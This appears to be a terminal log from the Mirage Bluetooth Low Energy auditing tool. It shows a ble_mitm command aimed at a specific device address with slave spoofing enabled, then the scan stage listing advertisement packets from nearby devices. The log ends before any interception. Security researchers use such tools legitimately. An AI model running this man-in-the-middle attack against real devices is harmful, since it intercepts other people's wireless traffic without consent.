mirage ble_mitm TARGET=FA:A1:C5:D0:71:34 CONNECTION_TYPE=random MASTER_SPOOFING=no SLAVE_SPOOFING=yes
[INFO] Module ble_mitm loaded !
[SUCCESS] HCI Device (hci0) successfully instanciated !
[SUCCESS] HCI Device (hci1) successfully instanciated !
[INFO] Entering SCAN stage ...
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=46:D0:2E:8E:35:CC | data=02011a0dff4c00160800d22cc757f9209e >>
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=64:72:4A:60:23:B4 | data=02011a020a070cff4c0010077d1fb386debe28 >>
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=C4:B6:83:5D:7E:C8 | data=02010611070b00007a170000800010000000980000020a00 >>
[PACKET] << BLE - Advertisement Packet | type=SCAN_RSP | addr=C4:B6:83:5D:7E:C8 | data=0608303030363809ff2e0115819100c000 >>
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=36:D6:3C:7C:21:4A | data=1eff060001092002d23292c8ec9a1f9bdd5d9cd902d44a786a79af2a6bba61 >>
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=6F:51:D0:84:AA:D8 | data=02011a020a0c0aff4c001005361c455a05 >>
[PACKET] << BLE - Advertisement Packet | type=SCAN_RSP | addr=6F:51:D0:84:AA:D8 | data= >>
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=45:32:7B:C6:82:09 | data=02011a020a0c0cff4c001007751f45684df748 >>
[PACKET] << BLE - Advertisement Packet | type=SCAN_RSP | addr=45:32:7B:C6:82:09 | data= >>
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=21:9B:EF:9D:B2:54 | data=1eff060001092002cc84a4302514d2394360b2730ccfe0061b68c315c8f969 >>
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=60:37:53:90:75:F0 | data=02011a020a0c0bff4c001006331e98022577 >>
[PACKET] << BLE - Advertisement Packet | type=SCAN_RSP | addr=60:37:53:90:75:F0 | data= >>
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=D2:1B:75:2B:99:F8 | data=07ff4c0012022c01 >>
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=F4:9B:95:BA:1F:69 | data=07ff4c0012020002 >>
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=14:BF:28:27:59:15 | data=1eff06000109202247b971b8baf06a157fa981865bc4b9d89cbede35ed7c1c >>
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=2A:AA:A2:19:9A:BA | data=1eff0600010920023b72f3d8dfb5d47c7b064607182aaa389603149106aa18 >>
[PACKET] << BLE - Advertisement Packet | type=ADV_IND | addr=63:77:23:71:2C:E0 | data=02011a1bff4c000c0e088d0b3da3d82dfc5a04a92121b810066b1dab43f748 >>
